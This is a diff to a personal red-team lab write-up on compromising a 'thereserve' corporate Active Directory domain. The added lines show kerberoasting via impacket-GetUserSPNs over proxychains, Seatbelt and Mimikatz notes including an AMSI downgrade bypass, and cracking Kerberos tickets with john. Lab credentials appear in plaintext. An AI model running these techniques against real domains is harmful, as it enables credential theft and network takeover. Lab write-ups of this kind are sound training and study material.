@@ -373,10 +373,13 @@ Crying out the credential changing, Tiberious struggles till he get `admin : pas
 proxychains4 python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.119.102 -u 'lisa.moore' -p 'Scientist2006'
 ```
 
-[[RTCC-BH-Notes-Corp]]
+I added 2[[RTCC-BH-Notes-Corp]] - and then kerberoasted the dc
 
+```bash
+proxychains4 impacket-GetUserSPNs -dc-ip 10.200.119.102 -request 'corp.thereserve.loc/laura.wood'
+```
 
-
+![](kerberoastagasm.png)
 
 
 ![](bigbypass.png)
@@ -459,6 +462,9 @@ xsel -b > WRK1-sc-qc.output
 
 Sadly I got 193 error meaning that I could perform the path hijack and the serviceName service outputs error 5 meaning I need administrator
 
+
+[seatbelt commmands](https://github.com/GhostPack/Seatbelt)
+
 ```go
 // 
 seatbelt -h 
@@ -488,10 +494,25 @@ seatbelt powershell // We can downgrade to bypass AMSI
 
 -  Mimikatz no laps all bypassing WinDefend still required
 	- `seatbelt DpapiMasterKeys` - use `sekurla:dpapi` module
-
 - Python311
 
- ## Full Compromise of CORP Domain
+#### Seatbelt required: the Hound brings back the biscuits
+
+At this point I went over my Bloodhound information, then kerberoasted svc accounts.
+
+[Hashcat 13100](https://hashcat.net/wiki/doku.php?id=example_hashes) or krb5tgs with john
+```
+sudo apt install ntpdate
+sudo ntpdate $dc_ip
+
+john hash --format=krb5tgs   /usr/share/wordlists/rockyou.txt
+- Password1!
+```
+
+
+## Full Compromise of CORP Domain
+
+
 ## Full Compromise of Parent Domain
 ## Full Compromise of BANK Domain
 ## Compromise of SWIFT and Payment Transfer
